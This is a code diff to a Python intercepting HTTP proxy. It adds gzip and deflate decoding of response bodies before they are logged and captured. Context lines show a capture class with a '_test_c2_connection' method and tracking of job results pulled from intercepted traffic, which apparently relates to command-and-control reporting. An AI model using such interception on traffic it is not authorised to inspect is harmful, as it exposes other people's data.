@@ -13,6 +13,7 @@ import json
 import logging
 import os
 import gzip
+import zlib
 import re
 import select
 import socket
@@ -264,6 +265,7 @@ class TrafficCapture:
         self.pending_jobs: Dict[Any, dict] = {}
         self._test_c2_connection()
 
+
     def _fetch_public_ip(self) -> str:
         services = [
             "https://api.ipify.org?format=json",
@@ -417,7 +419,7 @@ class TrafficCapture:
                 print("   No pending job data found for this response")
                 return
             job_data = self.pending_jobs[key]
-            response = json.loads(gzip.decompress(response_body))
+            response = json.loads(response_body)
             job_id = None
             if isinstance(response, dict):
                 job_id = (
@@ -441,7 +443,7 @@ class TrafficCapture:
 
     def _handle_results(self, method, host, path, status, response_body, url):
         try:
-            body = json.loads(gzip.decompress(response_body))
+            body = json.loads(response_body)
             job_id = None
             m = re.search(r"/jobs/([^/]+)/results", path)
             if m:
@@ -472,6 +474,22 @@ capture = TrafficCapture()
 
 def normalize_host(host):
     return host.rstrip(".").encode("idna").decode("ascii").lower()
+
+
+
+def decode_response_body(payload: bytes, content_encoding: str) -> bytes:
+    """Decode upstream content for inspection, without modifying wire bytes."""
+    encoding = content_encoding.strip().lower()
+    if not encoding or encoding == "identity":
+        return payload
+    if encoding == "gzip":
+        return gzip.decompress(payload)
+    if encoding == "deflate":
+        try:
+            return zlib.decompress(payload)
+        except zlib.error:
+            return zlib.decompress(payload, -zlib.MAX_WBITS)
+    raise ValueError(f"Unsupported Content-Encoding: {content_encoding}")
 
 
 def log_message(label, url, first_line, headers, body):
@@ -742,28 +760,32 @@ class ProxyHandler(BaseHTTPRequestHandler):
             payload = response.read()
 
             if target:
-                encoding = response.headers.get("Content-Encoding", "").lower()
-                readable_payload = payload
+                try:
+                    inspection_payload = decode_response_body(
+                        payload, response.headers.get("Content-Encoding", "")
+                    )
+                except (OSError, EOFError, ValueError, zlib.error) as exc:
+                    LOG.warning("Cannot decode response for inspection (%s): %s",
+                                display_url, exc)
+                    inspection_payload = None
 
-                if encoding == "gzip":
-                    readable_payload = gzip.decompress(payload)
-
-                log_message(
-                    "RESPONSE",
-                    display_url,
-                    f"HTTP/1.1 {response.status} {response.reason}",
-                    response.headers,
-                    readable_payload,
-                )
-                capture.on_response(
-                    key=capture_key,
-                    method=self.command,
-                    host=host,
-                    path=path,
-                    status=response.status,
-                    response_body=payload,
-                    url=display_url,
-                )
+                if inspection_payload is not None:
+                    log_message(
+                        "RESPONSE",
+                        display_url,
+                        f"HTTP/1.1 {response.status} {response.reason}",
+                        response.headers,
+                        inspection_payload,
+                    )
+                    capture.on_response(
+                        key=capture_key,
+                        method=self.command,
+                        host=host,
+                        path=path,
+                        status=response.status,
+                        response_body=inspection_payload,
+                        url=display_url,
+                    )
 
             self.send_response_only(response.status, response.reason)
             response_started = True
